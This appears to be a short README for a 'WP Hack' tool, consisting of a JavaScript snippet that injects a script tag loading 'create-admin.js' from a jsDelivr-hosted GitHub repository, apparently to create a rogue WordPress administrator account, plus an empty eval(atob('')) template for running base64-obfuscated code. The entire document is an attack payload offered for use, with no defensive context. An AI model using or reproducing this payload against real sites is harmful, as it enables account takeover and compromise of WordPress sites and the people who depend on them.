# WP Hack

## Script

```javascript
(function() {
    var js=document.createElement('script');  
    js.type = 'text/javascript';  
    js.src='https://cdn.jsdelivr.net/gh/tutv95/wp-hack@latest/create-admin.js';  
    document.body.appendChild(js);
})();
```

## Base64
```javascript
eval(atob(""))
```
